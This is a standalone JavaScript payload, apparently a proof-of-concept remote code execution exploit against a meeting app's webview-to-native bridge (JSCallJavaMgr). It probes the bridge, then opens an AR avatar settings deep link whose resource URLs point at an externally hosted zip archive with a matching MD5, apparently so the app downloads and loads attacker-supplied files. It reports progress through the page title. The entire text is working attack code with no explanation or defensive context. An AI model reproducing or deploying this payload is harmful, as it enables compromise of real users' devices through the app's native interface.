(function(){
  document.title='P92TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P92CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P92TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P92TB-NOMGR:'+location.host;return}
  var zip='https://gitwhs.github.io/wm-poc-rce/p92avatar.zip';
  var md5='f540ee3ebab74e2d9c993671b9ebaae0';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['A1','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/ar_avatar_setting?model_resource_url='+encodeURIComponent(zip)+'&model_resource_md5='+md5+'&resource_url='+encodeURIComponent(zip)+'&resource_md5='+md5,
      router_params:{
        model_resource_url:zip,
        model_resource_md5:md5,
        resource_url:zip,
        resource_md5:md5,
        from_webView:true
      }
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P92TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P92-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
